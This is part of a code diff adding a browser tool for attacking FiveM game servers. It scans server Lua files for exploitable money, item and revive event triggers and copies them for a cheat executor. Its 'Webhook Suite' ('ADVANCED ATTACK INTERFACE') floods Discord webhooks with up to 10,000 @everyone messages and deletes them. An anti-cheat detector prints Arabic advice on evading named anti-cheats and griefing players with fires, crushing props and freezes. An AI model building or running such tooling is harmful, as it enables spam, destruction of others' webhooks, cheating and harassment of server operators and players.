+                <div class="search-box">
+                    <span class="search-icon">🔍</span>
+                    <input type="text" id="resultSearch" class="search-input" placeholder="Search in results..."
+                        oninput="filterResults()">
+                </div>
+                <button class="export-btn" onclick="exportTxt()">Export .txt</button>
+            </div>
+            <div class="results-area" id="resultsArea">
+                <div class="empty-state">
+                    <div class="empty-icon">🔍</div>
+                    <div class="empty-text">Drop .lua files or click "Select Folder"<br>then choose a search type from
+                        the sidebar
+                    </div>
+                </div>
+            </div>
+        </div>
+
+    </div>
+    <script>
+        const DYNAMIC = ["shark-leotools", "myMinijobCore:pay", "ak47_prospecting", "ak47_druglabs:sellDrug", "wasabi_ambulance:placeOnStretcher", "wasabi_ambulance:revive", "solos-joints", "updatePlayerPunishment", "punishment", "ak47_idcard", "esx_dmvschool:addLicense", "jarod:addCard", "s1n_atmrobbery:giveReward", "cs:fscanner:scanFinger", "cs:fscanner:giveScan", "dz-fishing:server:ReceiveFish", "dz-fishing:server:SellFishes", "lotto:win", "FaxDisVeh:CheckPermission", "Amazon:cash", "KraKss:giveMoneyForDelivery", "sv-cards:additem", "x-storerobbery:udanedajkase", "nx_garden:wyjmijkwiatka", "qb-storerobbery:server:SafeReward", "ak47_moneywash:putmoney", "ak47_moneywash:moneyout", "drift:pabeidza2", "vehicletransfer:server:handleConfirmation", "Optix165:KickAll", "Admin:jumpscare", "lation_detecting:RemoveItems", "m-Fishing:Server:CatchLegalFish", "m-Fishing:Server:SellLegalFish", "fishing:server:fishingResult", "fishing:server:sellFish", "immense-drugs:sellDrugs", "frp-flitser:server:betaal", "faciFishing:giveFish", "faciFish:sellFishServer", "recolteDrogueNew", "traitementDrogueNew", "venteDrogueNew", "esx_cambriolage:giveitem", "esx_cambriolage:Bijoux"];
+
+        let files = [];
+        let imageMap = {};
+
+        const dz = document.getElementById('dropZone');
+        dz.addEventListener('dragover', e => { e.preventDefault(); dz.classList.add('drag-over') });
+        dz.addEventListener('dragleave', () => dz.classList.remove('drag-over'));
+        dz.addEventListener('drop', e => { e.preventDefault(); dz.classList.remove('drag-over'); handleFiles(e.dataTransfer.files) });
+
+        function handleFiles(list) {
+            const all = Array.from(list);
+            const lua = all.filter(f => f.name.endsWith('.lua'));
+            const imgs = all.filter(f => /\.(png|jpg|jpeg|webp)$/i.test(f.name));
+
+            if (!lua.length && !imgs.length) { setStatus('No relevant files found', ''); return; }
+
+            // Map images
+            imageMap = {};
+            imgs.forEach(f => {
+                imageMap[f.name.toLowerCase()] = URL.createObjectURL(f);
+            });
+
+            files = [];
+            let done = 0, totalLines = 0;
+            setStatus('Loading...', 'searching');
+            lua.forEach(f => {
+                const r = new FileReader();
+                r.onload = ev => {
+                    const lines = ev.target.result.split('\n');
+                    totalLines += lines.length;
+                    files.push({ name: f.name, path: f.webkitRelativePath || f.name, lines });
+                    if (++done === lua.length) {
+                        document.getElementById('fCount').textContent = files.length;
+                        document.getElementById('lCount').textContent = totalLines.toLocaleString();
+                        document.getElementById('fileStats').classList.add('visible');
+                        setStatus('Ready', 'active');
+                        document.getElementById('resultCount').textContent = 'Loaded ' + files.length + ' file' + (files.length > 1 ? 's' : '') + ' — choose a search type';
+                        document.getElementById('resultsArea').innerHTML = '<div class="empty-state"><div class="empty-icon">✅</div><div class="empty-text">' + files.length + ' file' + (files.length > 1 ? 's' : '') + ' loaded<br>Choose a search type from the sidebar</div></div>';
+                    }
+                };
+                r.readAsText(f, 'utf-8');
+            });
+        }
+
+        function switchTab(name, el) {
+            if (name !== 'webhooks') {
+                document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+                document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
+
+                if (el) el.classList.add('active');
+
+                const tab = document.getElementById('tab-' + name);
+                if (tab) tab.classList.add('active');
+
+                document.getElementById('webhook-header').style.display = 'none';
+                document.getElementById('statusPill').style.display = 'block';
+                document.getElementById('resultCount').style.display = 'block';
+                document.querySelector('.search-box').style.display = 'block';
+                document.querySelector('.export-btn').style.display = 'block';
+            } else {
+                openWebhooksPage();
+            }
+        }
+
+        function openWebhooksPage() {
+            const area = document.getElementById('resultsArea');
+            document.getElementById('webhook-header').style.display = 'flex';
+            document.getElementById('statusPill').style.display = 'none';
+            document.getElementById('resultCount').style.display = 'none';
+            document.querySelector('.search-box').style.display = 'none';
+            document.querySelector('.export-btn').style.display = 'none';
+
+            area.innerHTML = `
+        <div style="width: 100%; height: 100%; display: flex; justify-content: center; align-items: flex-start; padding-top: 50px;">
+          <div class="webhook-page" style="margin: 0; width: 100%;">
+            <div style="text-align:center; margin-bottom:25px;">
+              <div style="font-size:24px; margin-bottom:10px;">⚡ Webhook Suite</div>
+              <div style="font-size:11px; color:var(--muted); font-family:var(--mono);">ADVANCED ATTACK INTERFACE</div>
+            </div>
+
+            <label class="webhook-label">TARGET URLS</label>
+            <div id="webhook-container">
+              <div class="webhook-row" style="display:flex; gap:8px; margin-bottom:8px;">
+                <input type="text" class="webhook-url webhook-input" placeholder="https://discord.com/api/webhooks/...">
+              </div>
+            </div>
+            <button class="btn" id="add-webhook-btn" style="width:100%; justify-content:center; border-style:dashed; margin-bottom:20px;">+ Add New Target</button>
+            
+            <div class="tabs" style="padding:0; margin-bottom:20px;">
+              <button class="tab active" id="mode-simple" style="font-weight:600;">TEXT MESSAGE</button>
+              <button class="tab" id="mode-embed" style="font-weight:600;">RICH EMBED</button>
+            </div>
+
+            <div id="simple-fields">
+              <label class="webhook-label">MESSAGE CONTENT</label>
+              <textarea id="msg-content" class="webhook-input" rows="4">@everyone</textarea>
+            </div>
+
+            <div id="embed-fields" style="display:none;">
+              <label class="webhook-label">EMBED TITLE</label>
+              <input type="text" id="emb-title" class="webhook-input" placeholder="Enter title...">
+              <label class="webhook-label">DESCRIPTION</label>
+              <textarea id="emb-desc" class="webhook-input" rows="3">Enter description...</textarea>
+              <label class="webhook-label">SIDE COLOR</label>
+              <input type="color" id="emb-color" value="#00d4ff" style="width:100%; height:40px; border:none; background:var(--surface2); border-radius:8px; padding:4px; margin-bottom:15px; cursor:pointer;">
+            </div>
+
+            <div style="display:grid; grid-template-columns:1fr 1fr; gap:15px; margin-top:10px;">
+              <div>
+                <label class="webhook-label">BOT NAME</label>
+                <input type="text" id="bot-name" class="webhook-input" value="Trigger Finder">
+              </div>
+              <div>
+                <label class="webhook-label">AVATAR URL</label>
+                <input type="text" id="avatarUrl" class="webhook-input" value="https://cdn-icons-png.flaticon.com/512/3135/3135715.png">
+              </div>
+            </div>
+
+            <style>
+              .tts-checkbox-input { display: none; }
+              .tts-checkbox-box { width: 20px; height: 20px; border: 1px solid var(--border); border-radius: 6px; background: var(--surface2); display: flex; align-items: center; justify-content: center; transition: 0.2s; }
+              .tts-checkbox-icon { opacity: 0; font-size: 12px; color: var(--bg); transition: 0.2s; font-weight: 900; }
+              .tts-checkbox-input:checked + .tts-checkbox-box { background: var(--accent); border-color: var(--accent); }
+              .tts-checkbox-input:checked + .tts-checkbox-box .tts-checkbox-icon { opacity: 1; }
+            </style>
+            <div style="display:grid; grid-template-columns:1fr 1fr; gap:15px; align-items:end; margin-bottom:12px;">
+              <div>
+                <label class="webhook-label">MESSAGE COUNT</label>
+                <input type="number" id="bot-count" class="webhook-input" value="1" min="1" max="10000" style="margin-bottom:0 !important;">
+              </div>
+              <div style="height:40px; display:flex; align-items:center;">
+                <label style="display:flex; align-items:center; gap:10px; cursor:pointer; color:var(--text); font-size:13px; font-weight:700; font-family:var(--mono); letter-spacing:0.5px;">
+                  <input type="checkbox" id="tts-checkbox" class="tts-checkbox-input">
+                  <div class="tts-checkbox-box">
+                    <div class="tts-checkbox-icon">✓</div>
+                  </div>
+                  TTS
+                </label>
+              </div>
+            </div>
+            <div style="margin-top:20px;">
+              <button class="btn btn-primary" id="start-webhook-btn" style="width:100%; padding:14px; font-weight:700; font-size:14px; display:flex; justify-content:center; align-items:center; text-align:center;">EXECUTE ATTACK</button>
+              <button class="btn" id="stop-webhook-btn" style="width:100%; padding:14px; font-weight:700; font-size:14px; color:var(--accent3); border-color:var(--accent3); display:none; justify-content:center; align-items:center; text-align:center;">TERMINATE</button>
+            </div>
+
+            <div style="display:flex; gap:10px; margin-top:10px;">
+              <button class="btn" id="check-webhook-btn" style="flex:1; justify-content:center;">Check Valid</button>
+              <button class="btn" id="delete-webhook-btn" style="flex:1; justify-content:center; color:var(--accent3);">Destroy Hooks</button>
+            </div>
+          </div>
+        </div>
+      `;
+
+            // Re-bind events because HTML was overwritten
+            bindWebhookEvents();
+        }
+
+        
+        function copyToExecutor(text) {
+            navigator.clipboard.writeText(text);
+            const alertBox = document.createElement('div');
+            alertBox.style.position = 'fixed';
+            alertBox.style.bottom = '20px';
+            alertBox.style.right = '20px';
+            alertBox.style.background = 'var(--accent2)';
+            alertBox.style.color = '#fff';
+            alertBox.style.padding = '10px 20px';
+            alertBox.style.borderRadius = '8px';
+            alertBox.style.boxShadow = '0 5px 15px rgba(0,0,0,0.5)';
+            alertBox.style.zIndex = '999999';
+            alertBox.innerText = '✅ Copied for Executor!';
+            document.body.appendChild(alertBox);
+            setTimeout(() => alertBox.remove(), 2000);
+        }
+
+
+        let webhookStop = false;
+
+        function bindWebhookEvents() {
+            const addBtn = document.getElementById('add-webhook-btn');
+            const container = document.getElementById('webhook-container');
+            if (addBtn && container) {
+                addBtn.onclick = () => {
+                    const row = document.createElement('div');
+                    row.className = 'webhook-row';
+                    row.style = 'display:flex; gap:8px; margin-bottom:8px;';
+                    row.innerHTML = '<input type="text" class="webhook-url webhook-input" placeholder="https://discord.com/api/webhooks/..."><button class="btn" style="background:var(--danger);color:#fff;border:none;padding:0 15px;" onclick="this.parentElement.remove()">X</button>';
+                    container.appendChild(row);
+                };
+            }
+
+            const modeSimple = document.getElementById('mode-simple');
+            const modeEmbed = document.getElementById('mode-embed');
+            let isEmbed = false;
+            if (modeSimple && modeEmbed) {
+                modeSimple.onclick = () => {
+                    modeSimple.classList.add('active');
+                    modeEmbed.classList.remove('active');
+                    document.getElementById('simple-fields').style.display = 'block';
+                    document.getElementById('embed-fields').style.display = 'none';
+                    isEmbed = false;
+                };
+                modeEmbed.onclick = () => {
+                    modeEmbed.classList.add('active');
+                    modeSimple.classList.remove('active');
+                    document.getElementById('embed-fields').style.display = 'block';
+                    document.getElementById('simple-fields').style.display = 'none';
+                    isEmbed = true;
+                };
+            }
+
+            const startBtn = document.getElementById('start-webhook-btn');
+            const stopBtn = document.getElementById('stop-webhook-btn');
+            const statusBox = document.getElementById('webhook-stats-status');
+
+            if (startBtn) {
+                startBtn.onclick = async () => {
+                    const urls = Array.from(document.querySelectorAll('.webhook-url')).map(i => i.value.trim()).filter(v => v);
+                    if (!urls.length) return alert('No target URLs!');
+                    
+                    const count = parseInt(document.getElementById('bot-count').value) || 1;
+                    const botName = document.getElementById('bot-name').value;
+                    const avatar = document.getElementById('avatarUrl').value;
+                    const tts = document.getElementById('tts-checkbox').checked;
+
+                    let payload = {};
+                    if (isEmbed) {
+                        const title = document.getElementById('emb-title').value;
+                        const desc = document.getElementById('emb-desc').value;
+                        let colorHex = document.getElementById('emb-color').value;
+                        colorHex = colorHex ? colorHex.replace('#', '') : '00d4ff';
+                        payload = {
+                            username: botName, avatar_url: avatar, tts: tts,
+                            embeds: [{ title: title, description: desc, color: parseInt(colorHex, 16) }]
+                        };
+                    } else {
+                        payload = {
+                            username: botName, avatar_url: avatar, tts: tts,
+                            content: document.getElementById('msg-content').value
+                        };
+                    }
+
+                    webhookStop = false;
+                    startBtn.style.display = 'none';
+                    stopBtn.style.display = 'flex';
+                    if (statusBox) statusBox.classList.add('active');
+
+                    for (let i = 0; i < count; i++) {
+                        if (webhookStop) break;
+                        if (statusBox) statusBox.innerText = 'SENDING (' + (i+1) + '/' + count + ')...';
+                        for (const url of urls) {
+                            try {
+                                fetch(url, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });
+                            } catch(e){}
+                        }
+                        await new Promise(r => setTimeout(r, 150));
+                    }
+
+                    startBtn.style.display = 'flex';
+                    stopBtn.style.display = 'none';
+                    if (statusBox) {
+                        statusBox.innerText = 'READY';
+                        statusBox.classList.remove('active');
+                    }
+                };
+            }
+
+            if (stopBtn) {
+                stopBtn.onclick = () => {
+                    webhookStop = true;
+                };
+            }
+
+            const checkBtn = document.getElementById('check-webhook-btn');
+            if (checkBtn) {
+                checkBtn.onclick = async () => {
+                    const urls = Array.from(document.querySelectorAll('.webhook-url')).map(i => i.value.trim()).filter(v => v);
+                    if (!urls.length) return;
+                    let valid = 0, dead = 0;
+                    if (statusBox) statusBox.innerText = 'CHECKING...';
+                    for (const url of urls) {
+                        try {
+                            const res = await fetch(url);
+                            if (res.status === 200 || res.status === 401) valid++; // 401 is still valid webhook just needs token
+                            else dead++;
+                        } catch(e){ dead++; }
+                    }
+                    if (statusBox) statusBox.innerText = 'READY';
+                    alert('Valid: ' + valid + '\nDead: ' + dead);
+                };
+            }
+
+            const delBtn = document.getElementById('delete-webhook-btn');
+            if (delBtn) {
+                delBtn.onclick = async () => {
+                    if(!confirm('Are you sure you want to DESTROY these webhooks?')) return;
+                    const urls = Array.from(document.querySelectorAll('.webhook-url')).map(i => i.value.trim()).filter(v => v);
+                    if (statusBox) statusBox.innerText = 'DESTROYING...';
+                    for (const url of urls) {
+                        try { fetch(url, { method: 'DELETE' }); } catch(e){}
+                    }
+                    setTimeout(() => {
+                        if (statusBox) statusBox.innerText = 'READY';
+                        alert('Destroy requests sent.');
+                    }, 1000);
+                };
+            }
+        }
+
+        function scanAntiCheat() {
+            if (!files.length) { setStatus('⚠️ حمّل ملفات السيرفر أولاً', ''); return; }
+            setStatus('جاري الفحص العميق للحماية...', 'searching');
+            
+            // Allow UI to render the searching status
+            setTimeout(() => {
+                let detectedAC = 'txAdmin (Default)';
+                let acData = null;
+                
+                const acSigs = {
+                    'FiveGuard': {
+                        keywords: ['fiveguard', 'fg-obfuscated', 'fg_client', 'AddExplosion'], // AddExplosion checks, physics checks
+                        color: 'accent3',
+                        exploits: [
+                            { name: 'فعص اللاعبين (Physics Crush)', desc: 'استخدم حاوية (prop_container_01a) تسقط من السماء لقتل اللاعبين بوزنها. الفايف قارد يعتبره حادث اصطدام طبيعي في المحرك ومستحيل يعطيك بان.', safe: true },
+                            { name: 'حرق اللاعبين (StartScriptFire)', desc: 'دالة StartScriptFire تفتح نار تحت اللاعبين، حماية الفايف قارد غالباً ما تكشفها لأنها ليست AddExplosion.', safe: true },
+                            { name: 'تفجير صامت (Airstrike RPG)', desc: 'استخدم ShootSingleBulletBetweenCoords برصاصة آر بي جي مخفية تسقط من السماء. قد ينتبه الأدمن إذا زادت عن حدها لكنها تتخطى المنع التلقائي.', safe: false }
+                        ]
+                    },
+                    'Eagle': {
+                        keywords: ['eagle_ac', 'eagle-anticheat', 'eg_client', 'Eagle'],
+                        color: 'primary',
+                        exploits: [
+                            { name: 'باي باس المنيو (Menu Bypass)', desc: 'حماية إيقل تركز على منع الإكسكيوترات المعروفة، لكن لو غيرت اسم القائمة حق الإكسكيوتر (Menu Title) يمديك تفتحها بدون بان.', safe: true },
+                            { name: 'ترجيرات مخفية', desc: 'إيقل ما يفحص الترجيرات اللي تتنفذ داخل NUI، لو عندك ثغرة XSS أو NUI Callback يمديك تدعس السيرفر.', safe: true }
+                        ]
+                    },
+                    'WaveShield': {
+                        keywords: ['waveshield', 'ws_client', 'ws-server'],
+                        color: 'danger',
+                        exploits: [
+                            { name: 'إيقاف الحماية (StopResource)', desc: 'إذا السيرفر ناسي يقفل صلاحيات الأدمن على ترجيرات معينة، يمديك تسوي سبام لترجيرات توقف ريسورس الموجة.', safe: false },
+                            { name: 'حذف أوبجكتات (Mass Delete)', desc: 'ويف شيلد قوي في منع الترسب، لكنه ضعيف في منع حذف الأوبجكتات (DeleteEntity) إذا كانت بعيدة عنك.', safe: true }
+                        ]
+                    },
+                    'Electron': {
+                        keywords: ['electron_ac', 'electron-anticheat', 'elec_client'],
+                        color: 'purple',
+                        exploits: [
+                            { name: 'سبام شات (Chat Spam)', desc: 'إلكترون يركز على ترجيرات الفلوس، لكنه يهمل ترجيرات الشات وتقدر تسوي سبام يعلق سيرفرهم.', safe: true },
+                            { name: 'تجميد اللاعبين (ClearPedTasks)', desc: 'استخدم ترجيرات الأنيميشن لعمل ClearPedTasksImmediately على اللاعبين وتجميدهم بمكانهم.', safe: true }
+                        ]
+                    },
+                    'Phoenix': {
+                        keywords: ['phoenix', 'phx-ac', 'phx'],
+                        color: 'orange',
+                        exploits: [
+                            { name: 'سبام ترجيرات (Trigger Spam)', desc: 'حماية فونيكس تملك ليمت على الترجيرات، لكن بعض ترجيرات الوظائف (esx_policejob) غير محمية. يمديك تسوي سبام.', safe: false },
+                            { name: 'ترسيب أسلحة صامت (GiveWeapon)', desc: 'استخدم ترجيرات شراء الأسلحة في المتاجر بدلاً من إعطاء سلاح مباشر لنفسك.', safe: true }
+                        ]
+                    }
+                };
+
+                // Deep Scan files to detect AC
+                for (const f of files) {
+                    const pathLower = f.path.toLowerCase();
+                    
+                    // Check file path
+                    for (const [acName, data] of Object.entries(acSigs)) {
+                        if (data.keywords.some(kw => pathLower.includes(kw))) {
+                            detectedAC = acName;
+                            acData = data;
+                            break;
+                        }
+                    }
+                    if (acData) break;
+                    
+                    // Check file content deeply
+                    const contentLower = f.lines.join('\n').toLowerCase();
+                    for (const [acName, data] of Object.entries(acSigs)) {
+                        if (data.keywords.some(kw => contentLower.includes(kw))) {
+                            detectedAC = acName;
+                            acData = data;
+                            break;
+                        }
+                    }
+                    if (acData) break;
+                }
+
+                if (!acData) {
+                    acData = {
+                        color: 'muted',
+                        exploits: [
+                            { name: 'استغلال الترجيرات المفتوحة', desc: 'أغلب السيرفرات اللي بدون حماية قوية يمديك تستخدم أي ترجير فيها بدون مشاكل، مثل ترجيرات الفلوس (esx_ambulancejob:revive) أو الوظائف.', safe: true },
+                            { name: 'ترسيب مركبات', desc: 'استخدم CreateVehicle محلي (Networked=false) عشان ما يكتشفك الأدمن لو كان يراقب الكونسول.', safe: true }
+                        ]
+                    };
+                }
+
+                let exploitsHtml = '';
+                acData.exploits.forEach(ex => {
+                    const badge = ex.safe 
+                        ? `<span style="background:rgba(50,255,126,0.1);color:var(--success);padding:2px 6px;border-radius:4px;font-size:10px;font-weight:bold;margin-left:8px;">✅ آمن (Safe)</span>` 
+                        : `<span style="background:rgba(255,56,56,0.1);color:var(--danger);padding:2px 6px;border-radius:4px;font-size:10px;font-weight:bold;margin-left:8px;">⚠️ خطر (Risky)</span>`;
+                    
+                    exploitsHtml += `
+                        <div style="background:var(--surface2); border-radius:8px; padding:12px; margin-bottom:10px; border-left: 3px solid var(--${acData.color || 'muted'});">
+                            <div style="display:flex; align-items:center; margin-bottom:6px;">
+                                <strong style="color:var(--text); font-size:13px;">${ex.name}</strong>
+                                ${badge}
+                            </div>
+                            <div style="color:var(--muted); font-size:12px; line-height:1.5;">${ex.desc}</div>
+                        </div>
+                    `;
+                });
+
+                const htmlFinal = `
+                    <div class="results-header" style="color:var(--text); border-bottom:1px solid var(--border); padding-bottom:12px; margin-bottom:16px;">
+                        <div style="font-size:16px; font-weight:bold; display:flex; align-items:center; gap:8px;">
+                            🛡️ نتائج الفحص العميق للحماية
+                        </div>
+                    </div>
+                    
+                    <div style="background:var(--surface); border:1px solid var(--border); border-radius:8px; padding:16px; margin-bottom:20px; text-align:center;">
+                        <div style="font-size:12px; color:var(--muted); margin-bottom:4px; text-transform:uppercase; letter-spacing:1px;">الحماية المكتشفة في السيرفر</div>
+                        <div style="font-size:24px; font-weight:bold; color:var(--${acData.color || 'muted'}); text-shadow: 0 0 10px rgba(0,0,0,0.5);">
+                            ${detectedAC}
+                        </div>
+                    </div>
+
+                    <div class="section-label" style="margin-bottom:12px;">🔥 الثغرات المقترحة وتخطي الحماية:</div>
+                    ${exploitsHtml}
+                `;
+
+                document.getElementById('resultsArea').innerHTML = htmlFinal;
+                setStatus('تم الفحص بنجاح', 'active');
+            }, 100);
+        }
+
+        async function deleteWebhooks() {
+            const urls = Array.from(document.querySelectorAll('.webhook-url')).map(i => i.value.trim()).filter(v => v.startsWith('http'));
+            if (!urls.length) { webhookLog('No URLs to delete', 'error'); return; }
+            if (!confirm(`Delete ${urls.length} webhooks?`)) return;
+            for (const url of urls) {
+                try {
+                    const res = await fetch(url, { method: 'DELETE' });
+                    if (res.status === 204) webhookLog('Deleted successfully', 'success');
+                    else webhookLog('Delete failed', 'error');
+                } catch (e) { webhookLog('Delete error', 'error'); }
+            }
+        }
+
+        function setStatus(msg, type) {
+            const p = document.getElementById('statusPill');
+            p.textContent = msg; p.className = 'status-pill' + (type ? ' ' + type : '');
+        }
+
+        function esc(s) { return s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;') }
+
+        function highlight(line, patterns, type) {
+            let s = esc(line);
+            patterns.forEach(p => {
+                const cls = type === 'web' ? 'hl hl-web' : type === 'dyn' ? 'hl hl-dyn' : 'hl';
+                const regex = new RegExp('(' + esc(p).replace(/[.*+?^${}()|[\]\\]/g, '\\$&') + ')', 'gi');
+                s = s.replace(regex, '<span class="' + cls + '">$1</span>');
+            });
+            return s;
+        }
+
+        function doSearch(patterns, filter) {
+            const out = {};
+            files.forEach(f => {
+                f.lines.forEach((line, i) => {
+                    const hit = patterns.some(p => line.toLowerCase().includes(p.toLowerCase()));
+                    const ok = !filter || filter.some(fk => line.toLowerCase().includes(fk.toLowerCase()));
+                    if (hit && ok) {
+                        if (!out[f.path]) out[f.path] = [];
+                        out[f.path].push({ num: i + 1, line: line.trim(), matched: patterns.filter(p => line.toLowerCase().includes(p.toLowerCase())) });
+                    }
+                });
+            });
+            return out;
+        }
+
+        let lastGroups = {};
+        let lastType = '';
+        let lastTitle = '';
+
+        function renderResults(groups, title, type) {
+            lastGroups = groups;
+            lastType = type;
+            lastTitle = title;
+
+            const area = document.getElementById('resultsArea');
+            let total = 0;
+            Object.entries(groups).forEach(([path, items]) => {
+                total += items.length;
+            });
+
+            const fc = Object.keys(groups).length;
+            document.getElementById('resultCount').textContent = total
+                ? title + ' — ' + total + ' result' + (total > 1 ? 's' : '') + ' in ' + fc + ' file' + (fc > 1 ? 's' : '')
+                : title + ' — No results found';
+
+            if (!total) {
+                area.innerHTML = '<div class="empty-state"><div class="empty-icon">🕵️</div><div class="empty-text">No results for "' + esc(title) + '"</div></div>';
+                return;
+            }
+
+            renderResultsInternal(groups, title, type, '');
+        }
+
+        function renderInChunks(items, container, type, startIndex = 0, onDone = null) {
+            const chunkSize = 50;
+            const end = Math.min(startIndex + chunkSize, items.length);
+            const fragment = document.createDocumentFragment();
+
+            for (let i = startIndex; i < end; i++) {
+                const it = items[i];
+                const ccode = it.itemData.code.toLowerCase();
+                const clabel = it.itemData.label.toLowerCase();
+                const isWeapon = ccode.startsWith('weapon_') || ccode.includes('blueprint') || clabel.includes('blueprint');
+                const card = document.createElement('div');
+                card.className = `item-card ${isWeapon ? 'weapon-card' : ''}`;
+
+                const imgSrc = imageMap[it.itemData.image.toLowerCase()] || '';
+
+                let finalImgHtml = '';
+                if (imgSrc) {
+                    finalImgHtml = `<img src="${imgSrc}" class="item-img" loading="lazy">`;
+                } else {
+                    let queryName = it.itemData.label.replace(/^unknown$/i, '').trim();
+                    const bQuery = encodeURIComponent(queryName + " gta 5 item icon");
+                    const autoImgSrc = "https://tse1.mm.bing.net/th?q=" + bQuery + "&w=100&h=100&c=7";
+                    const fallbackEmoji = isWeapon ? '🔫' : '📦';
+                    finalImgHtml = `<img src="${autoImgSrc}" class="item-img" loading="lazy" style="border-radius:6px; object-fit:contain; width:100%; height:100%; filter: drop-shadow(0 0 2px rgba(255,255,255,0.1));" onerror="this.outerHTML='<span style=\\'font-size:32px; filter: drop-shadow(0 0 8px rgba(255,255,255,0.2));\\'>${fallbackEmoji}</span>'">`;
+                }
+
+                card.innerHTML = `
+          <div class="item-img-container" style="${isWeapon ? 'border-color:var(--accent3);' : ''} padding:${imgSrc ? '0' : '2px'}; background:rgba(0,0,0,0.6);">
+            ${finalImgHtml}
+          </div>
+          <div class="item-info">
+            <div class="item-name">${esc(it.itemData.label)}</div>
+            <div class="item-code" style="${isWeapon ? 'background:rgba(255,71,87,0.1);color:var(--accent3);' : ''}">${esc(it.itemData.code)}</div>
+          </div>
+          <div class="item-file">${esc(it.path.split('/').pop())}</div>`;
+                fragment.appendChild(card);
+            }
+
+            container.appendChild(fragment);
+
+            if (end < items.length) {
+                requestAnimationFrame(() => renderInChunks(items, container, type, end, onDone));
+            } else if (onDone) {
+                onDone();
+            }
+        }
+
+        function renderCarsInChunks(items, container, type, startIndex = 0, onDone = null) {
+            const chunkSize = 50;
+            const end = Math.min(startIndex + chunkSize, items.length);
+            const fragment = document.createDocumentFragment();
+
+            for (let i = startIndex; i < end; i++) {
+                const it = items[i];
+                const card = document.createElement('div');
+                card.className = `item-card`;
+
+                const ccode = (it.vehData.code || '').toLowerCase();
+                const cname = (it.vehData.name || '').toLowerCase();
+                const cmake = (it.vehData.make || '').toLowerCase();
+                const fallbackName = (cmake ? cmake + ' ' + cname : cname).trim().replace(/[\\/:"*?<>|]/g, ''); // filename safe
+
+                // Search image by code.png, code.jpg, name.png, make name.png, etc.
+                let imgSrc = '';
+                const exts = ['.png', '.jpg', '.jpeg', '.webp'];
+                for (const ext of exts) {
+                    if (imageMap[ccode + ext]) { imgSrc = imageMap[ccode + ext]; break; }
+                    if (imageMap[cname + ext]) { imgSrc = imageMap[cname + ext]; break; }
+                    if (imageMap[fallbackName + ext]) { imgSrc = imageMap[fallbackName + ext]; break; }
+                }
+
+                const nameDisp = it.vehData.make ? `${it.vehData.make} ${it.vehData.name}` : it.vehData.name;
+
+                const isEmergency = ccode.includes('police') || ccode.includes('sheriff') || ccode.includes('fbi') || ccode.includes('fib') || ccode.includes('ems') || ccode.includes('ambo') || ccode.includes('ambulance') || ccode.includes('medic') || ccode.includes('fire') || ccode.includes('lssd') || ccode.includes('bcso') || ccode.includes('sast') || cname.includes('police') || cname.includes('sheriff') || cname.includes('ambulance') || (it.vehData.category || '').toUpperCase() === 'EMERGENCY & POLICE';
+                const fallbackPic = isEmergency
+                    ? `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512" style="width:36px;height:36px;fill:#00a8ff;filter:drop-shadow(0 0 6px rgba(0,168,255,0.5));opacity:0.9"><path d="M312 32c-13.3 0-24 10.7-24 24s10.7 24 24 24h25.4l11.4 34.2c-23.2 16.5-54.3 26.6-88.8 28.5V112c0-13.3-10.7-24-24-24s-24 10.7-24 24v31.4c-62.5-4.4-118.8-30.8-154-70-9-10-24.8-10.6-34.5-1.4s-10.6 24.8-1.4 34.5C53.7 151 127 185.7 210.9 191.1l-18.4 55.4C168.1 247.9 152 268.4 152 292v4.8l-37 12.3c-18.7 6.2-31 24-31 43.6V416c0 26.5 21.5 48 48 48s48-21.5 48-48h48c26.5 0 48-21.5 48-48h224c0 26.5 21.5 48 48 48s48-21.5 48-48h48c26.5 0 48-21.5 48-48v-63.3c0-19.6-12.3-37.4-31-43.6l-37-12.3V292c0-30.2-20.4-56.1-49.4-62.6L368 111.4V56c0-13.3-10.7-24-24-24h-32zM232 288h176c13.3 0 24 10.7 24 24s-10.7 24-24 24H232c-13.3 0-24-10.7-24-24s10.7-24 24-24z"/></svg>`
+                    : `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512" style="width:36px;height:36px;fill:#32ff7e;filter:drop-shadow(0 0 6px rgba(50,255,126,0.5));opacity:0.9"><path d="M280.6 153.2c-5.8-19.1-23-32.9-43-33.2L123.6 119C102.7 118.8 84 131 76.5 150.4L20.8 293.4c-12.8 33 2 69.8 32.7 85.3 12.5 6.4 26.6 9.8 41 9.8H112c0 26.5 21.5 48 48 48s48-21.5 48-48h224c0 26.5 21.5 48 48 48s48-21.5 48-48h48c26.5 0 48-21.5 48-48V256c0-17.7-14.3-32-32-32h-67.7l-48.4-56.5c-11.4-13.3-28-21.2-45.7-21.5l-203.6-2.8zM160 352a16 16 0 1 1 0 32 16 16 0 1 1 0-32zm320 0a16 16 0 1 1 0 32 16 16 0 1 1 0-32zm-35.8-128H264c-8.8 0-16-7.2-16-16s7.2-16 16-16h172c7.6 0 14.1 5.3 15.6 12.8l8.4 35.2z"/></svg>`;
+
+                let finalImgHtml = '';
+                if (imgSrc) {
+                    finalImgHtml = `<img src="${imgSrc}" class="item-img" loading="lazy">`;
+                } else if (fallbackName.trim().length > 0) {
+                    let cleanMake = cmake.replace(/^unknown$/i, '').trim();
+                    let cleanName = cname.replace(/^unknown$/i, '').trim();
+                    let queryName = (cleanMake ? cleanMake + ' ' + cleanName : cleanName).trim();
+                    let catName = (it.vehData.category || '').toLowerCase().replace(/s$/, '');
+                    if (catName.includes('emergency') || catName.includes('police')) catName = 'police car';
+                    if (!catName || catName === 'uncategorized') catName = 'vehicle';
+
+                    const bQuery = encodeURIComponent(queryName + " " + catName + " gta 5");
+                    const autoImgSrc = "https://tse1.mm.bing.net/th?q=" + bQuery + "&w=100&h=100&c=7";
+                    finalImgHtml = `<img src="${autoImgSrc}" class="item-img" loading="lazy" style="border-radius:6px; object-fit:cover; width:100%; height:100%;">`;
+                } else {
+                    finalImgHtml = fallbackPic;
+                }
+
+                card.innerHTML = `
+          <div class="item-img-container" style="border-color:${isEmergency ? '#00a8ff' : '#32ff7e'}; padding:${(imgSrc || fallbackName.trim().length > 0) ? '0' : '2px'};">
+            ${finalImgHtml}
+          </div>
+          <div class="item-info">
+            <div class="item-name">${esc(nameDisp)}</div>
